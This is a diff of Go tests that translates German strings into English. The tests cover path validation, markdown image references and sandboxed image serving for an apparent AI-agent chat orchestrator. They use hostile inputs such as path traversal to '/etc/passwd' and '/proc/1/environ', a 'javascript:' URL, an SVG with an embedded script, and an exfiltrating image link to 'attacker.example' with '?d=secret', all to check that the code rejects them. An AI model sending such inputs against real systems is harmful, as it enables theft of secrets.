@@ -15,29 +15,29 @@ func TestNormalizeImagePath(t *testing.T) {
 		"plot.png":                     "/workspace/plot.png",
 		"./out/a.png":                  "/workspace/out/a.png",
 		"/workspace/plot.png":          "/workspace/plot.png",
-		"/workspace/inputs/foto.jpg":   "/workspace/inputs/foto.jpg",
+		"/workspace/inputs/photo.jpg":  "/workspace/inputs/photo.jpg",
 		"/tmp/x.gif":                   "/tmp/x.gif",
-		"/home/agent/bilder/b.webp":    "/home/agent/bilder/b.webp",
+		"/home/agent/images/b.webp":    "/home/agent/images/b.webp",
 		"file:///workspace/plot.png":   "/workspace/plot.png",
 		"/workspace/a/../b.png":        "/workspace/b.png",
 		"my plot.png":                  "/workspace/my plot.png",
-		"  /workspace/leer.png  ":      "/workspace/leer.png",
-		"/workspace//doppelt//x.png":   "/workspace/doppelt/x.png",
-		"unter/ordner/./und/../x.png":  "/workspace/unter/ordner/x.png",
+		"  /workspace/space.png  ":     "/workspace/space.png",
+		"/workspace//double//x.png":    "/workspace/double/x.png",
+		"sub/folder/./and/../x.png":    "/workspace/sub/folder/x.png",
 		"/workspace/umlaut-äöü.png":    "/workspace/umlaut-äöü.png",
-		"/workspace/ohne-endung":       "/workspace/ohne-endung",
-		"/workspace/klammer(1).png":    "/workspace/klammer(1).png",
+		"/workspace/no-extension":      "/workspace/no-extension",
+		"/workspace/bracket(1).png":    "/workspace/bracket(1).png",
 		"/home/agent/.cache/x/y/z.png": "/home/agent/.cache/x/y/z.png",
 	}
 	for in, want := range ok {
 		got, err := NormalizeImagePath(in)
 		if err != nil || got != want {
-			t.Errorf("%q: %q %v, erwartet %q", in, got, err, want)
+			t.Errorf("%q: %q %v, want %q", in, got, err, want)
 		}
 	}
 	bad := []string{
-		"", "   ", "https://angreifer.example/p.png", "http://x/y.png", "//angreifer.example/p.png",
-		"data:image/png;base64,AAAA", "javascript:alert(1)", "ftp://x/y.png", "file://angreifer/x.png",
+		"", "   ", "https://attacker.example/p.png", "http://x/y.png", "//attacker.example/p.png",
+		"data:image/png;base64,AAAA", "javascript:alert(1)", "ftp://x/y.png", "file://attacker/x.png",
 		"/etc/passwd", "/agent/config/models.json", "/workspace", "/workspace/", "/tmp", "/home/agent",
 		"../etc/passwd", "/workspace/../etc/passwd", "../../agent/sessions/s.jsonl", "/proc/1/environ",
 		"/workspacex/a.png", "/tmpfoo/a.png", "/home/agentx/a.png", "/opt/agw/x.png",
@@ -45,7 +45,7 @@ func TestNormalizeImagePath(t *testing.T) {
 	}
 	for _, in := range bad {
 		if got, err := NormalizeImagePath(in); err == nil {
-			t.Errorf("%q wurde angenommen: %q", in, got)
+			t.Errorf("%q was accepted: %q", in, got)
 		}
 	}
 }
@@ -66,33 +66,33 @@ func TestDetectImageType(t *testing.T) {
 	}
 	for in, want := range cases {
 		if got := DetectImageType([]byte(in)); got != want {
-			t.Errorf("%q: %q, erwartet %q", in, got, want)
+			t.Errorf("%q: %q, want %q", in, got, want)
 		}
 	}
 }
 
 func TestImageRefs(t *testing.T) {
-	md := "Hier die Grafik:\n\n![Verlauf](/workspace/plot.png)\n\n" +
-		"Und relativ ![b](out/b.png \"Titel\") sowie ![c](<mein bild.png>).\n" +
-		"Fremd: ![x](https://angreifer.example/p.png?d=geheim) und ![y](data:image/png;base64,AAAA)\n" +
-		"Doppelt: ![Verlauf nochmal](/workspace/plot.png)\n" +
-		"```\n![im Code](/workspace/code.png)\n```\n" +
-		"Inline `![auch Code](/workspace/inline.png)` und ein Link [kein Bild](/workspace/link.png).\n" +
-		"Außerhalb: ![p](/etc/passwd) ![q](../agent/x.png)"
+	md := "Here is the chart:\n\n![History](/workspace/plot.png)\n\n" +
+		"And relative ![b](out/b.png \"Title\") as well as ![c](<my image.png>).\n" +
+		"Foreign: ![x](https://attacker.example/p.png?d=secret) and ![y](data:image/png;base64,AAAA)\n" +
+		"Duplicate: ![History again](/workspace/plot.png)\n" +
+		"```\n![in code](/workspace/code.png)\n```\n" +
+		"Inline `![code too](/workspace/inline.png)` and a link [not an image](/workspace/link.png).\n" +
+		"Outside: ![p](/etc/passwd) ![q](../agent/x.png)"
 	got := ImageRefs(md)
-	want := []string{"/workspace/plot.png", "/workspace/out/b.png", "/workspace/mein bild.png"}
+	want := []string{"/workspace/plot.png", "/workspace/out/b.png", "/workspace/my image.png"}
 	if !slices.Equal(got, want) {
-		t.Fatalf("Verweise: %q, erwartet %q", got, want)
+		t.Fatalf("references: %q, want %q", got, want)
 	}
-	if ImageRefs("ohne Bilder") != nil {
-		t.Fatal("leerer Text liefert Verweise")
+	if ImageRefs("no images") != nil {
+		t.Fatal("empty text returns references")
 	}
 	var many strings.Builder
 	for i := range 50 {
 		many.WriteString("![a](/workspace/" + strings.Repeat("x", i+1) + ".png)\n")
 	}
 	if n := len(ImageRefs(many.String())); n != maxImageRefs {
-		t.Fatalf("%d Verweise, erwartet höchstens %d", n, maxImageRefs)
+		t.Fatalf("%d references, want at most %d", n, maxImageRefs)
 	}
 }
 
@@ -105,7 +105,7 @@ func TestMessageImageKey(t *testing.T) {
 	}
 	for in, want := range cases {
 		if got := MessageImageKey(json.RawMessage(in)); got != want {
-			t.Errorf("%s: %q, erwartet %q", in, got, want)
+			t.Errorf("%s: %q, want %q", in, got, want)
 		}
 	}
 	if !ValidImageMsg("ts-5") || ValidImageMsg("") || ValidImageMsg("a/b") || ValidImageMsg(strings.Repeat("a", 200)) {
@@ -116,53 +116,53 @@ func TestMessageImageKey(t *testing.T) {
 func TestImageObjectKeyDependsOnMsgAndPath(t *testing.T) {
 	a := imageObjectKey("c", "m1", "/workspace/a.png")
 	if a == imageObjectKey("c", "m2", "/workspace/a.png") || a == imageObjectKey("c", "m1", "/workspace/b.png") {
-		t.Fatal("Schlüssel unterscheidet Antwort und Pfad nicht")
+		t.Fatal("key does not distinguish answer and path")
 	}
 	if !strings.HasPrefix(a, "c/images/") || strings.Contains(strings.TrimPrefix(a, "c/images/"), "/") {
-		t.Fatalf("Schlüssel: %q", a)
+		t.Fatalf("key: %q", a)
 	}
 }
 
-const pngBytes = "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR-Bilddaten"
+const pngBytes = "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR-imagedata"
 
-// Nach einer Antwort mit Bildverweis sichert der Orchestrator das Bild; es bleibt
-// abrufbar, wenn der Chat ruht. Fremde Pfade, Nicht-Bilder und zu große Dateien nicht.
+// After an answer with an image reference the orchestrator saves the image; it stays
+// retrievable when the chat is idle. Foreign paths, non-images and too large files are not saved.
 func TestImagesCapturedAndServedAfterSuspend(t *testing.T) {
 	e := setup(t)
 	e.m.opt.ImageMaxBytes = 64
 	ctx := context.Background()
-	c, err := e.m.Create(ctx, NewChat{Title: "bilder"})
+	c, err := e.m.Create(ctx, NewChat{Title: "images"})
 	if err != nil {
 		t.Fatal(err)
 	}
 	a := e.agent(0)
 	a.mu.Lock()
 	a.files["/workspace/plot.png"] = []byte(pngBytes)
-	a.files["/workspace/notiz.png"] = []byte("<svg><script>alert(1)</script></svg>")
-	a.files["/workspace/gross.png"] = []byte(pngBytes + strings.Repeat("x", 100))
-	a.reply = `Fertig: ![Verlauf](plot.png) ![n](/workspace/notiz.png)`
+	a.files["/workspace/note.png"] = []byte("<svg><script>alert(1)</script></svg>")
+	a.files["/workspace/large.png"] = []byte(pngBytes + strings.Repeat("x", 100))
+	a.reply = `Done: ![History](plot.png) ![n](/workspace/note.png)`
 	a.mu.Unlock()
-	if _, err := e.m.Send(ctx, c.ID, "Zeichne"); err != nil {
+	if _, err := e.m.Send(ctx, c.ID, "Draw"); err != nil {
 		t.Fatal(err)
 	}
 	waitSettled(t, e, c.ID)
 	msgs, _ := e.st.Messages(ctx, c.ID)
 	msg := MessageImageKey(msgs[len(msgs)-1].Message)
 	if msg == "" {
-		t.Fatal("keine Kennung der Antwort")
+		t.Fatal("no answer ID")
 	}
-	// Die Sicherung läuft im Hintergrund.
+	// Saving runs in the background.
 	var saved bool
 	for deadline := time.Now().Add(3 * time.Second); time.Now().Before(deadline) && !saved; time.Sleep(10 * time.Millisecond) {
 		_, err := e.st.GetChatImage(ctx, c.ID, msg, "/workspace/plot.png")
 		saved = err == nil
 	}
 	if !saved {
-		t.Fatal("Bild nicht gesichert")
+		t.Fatal("image not saved")
 	}
-	// Die Datei in der Sandbox ändert sich danach: maßgeblich bleibt die gesicherte Fassung.
+	// The file in the sandbox changes afterwards: the saved version stays authoritative.
 	a.mu.Lock()
-	a.files["/workspace/plot.png"] = []byte("GIF89a-später")
+	a.files["/workspace/plot.png"] = []byte("GIF89a-later")
 	a.mu.Unlock()
 	if _, err := e.m.Suspend(ctx, c.ID); err != nil {
 		t.Fatal(err)
@@ -173,27 +173,27 @@ func TestImagesCapturedAndServedAfterSuspend(t *testing.T) {
 	}
 	defer rc.Close()
 	if img.ContentType != "image/png" || img.Size != int64(len(pngBytes)) {
-		t.Fatalf("Bild: %+v", img)
+		t.Fatalf("image: %+v", img)
 	}
-	for _, p := range []string{"/workspace/notiz.png", "/workspace/gross.png", "/workspace/fehlt.png"} {
+	for _, p := range []string{"/workspace/note.png", "/workspace/large.png", "/workspace/missing.png"} {
 		if _, _, err := e.m.OpenImage(ctx, c.ID, msg, p); !errors.Is(err, ErrImageUnavailable) {
-			t.Errorf("%s: %v, erwartet nicht verfügbar", p, err)
+			t.Errorf("%s: %v, want unavailable", p, err)
 		}
 	}
 	if _, _, err := e.m.OpenImage(ctx, c.ID, msg, "/etc/passwd"); !errors.Is(err, ErrInvalid) {
 		t.Errorf("/etc/passwd: %v", err)
 	}
 	if _, _, err := e.m.OpenImage(ctx, c.ID, "a/b", "/workspace/plot.png"); !errors.Is(err, ErrInvalid) {
-		t.Errorf("ungültige Kennung: %v", err)
+		t.Errorf("invalid ID: %v", err)
 	}
-	// Keine Artefakte: Anzeige-Bilder sind eine eigene Art.
+	// No artifacts: display images are a kind of their own.
 	if arts, _ := e.st.ListArtifacts(ctx, c.ID); len(arts) != 0 {
-		t.Fatalf("Artefakte: %+v", arts)
+		t.Fatalf("artifacts: %+v", arts)
 	}
 }
 
-// Bei aktivem Chat liest der Abruf ein noch nicht gesichertes Bild aus der Sandbox,
-// mit Größengrenze und über realpath (keine Symlinks aus den erlaubten Orten hinaus).
+// With an active chat, retrieval reads a not yet saved image from the sandbox, with a size
+// limit and via realpath (no symlinks out of the permitted locations).
 func TestOpenImageReadsFromLiveSandbox(t *testing.T) {
 	e := setup(t)
 	ctx := context.Background()
@@ -211,7 +211,7 @@ func TestOpenImageReadsFromLiveSandbox(t *testing.T) {
 	}
 	rc.Close()
 	if img.ContentType != "image/png" {
-		t.Fatalf("Bild: %+v", img)
+		t.Fatalf("image: %+v", img)
 	}
 	a.mu.Lock()
 	var script string
@@ -222,9 +222,9 @@ func TestOpenImageReadsFromLiveSandbox(t *testing.T) {
 	}
 	a.mu.Unlock()
 	if !strings.Contains(script, "realpath -e") || !strings.Contains(script, "head -c") || !strings.Contains(script, "/workspace/*") {
-		t.Fatalf("Leseskript: %q", script)
+		t.Fatalf("read script: %q", script)
 	}
 	if _, _, err := e.m.OpenImage(ctx, "00000000-0000-0000-0000-000000000000", "ts-1", "/tmp/x.png"); !errors.Is(err, ErrNotFound) {
-		t.Fatalf("fremder Chat: %v", err)
+		t.Fatalf("foreign chat: %v", err)
 	}
 }
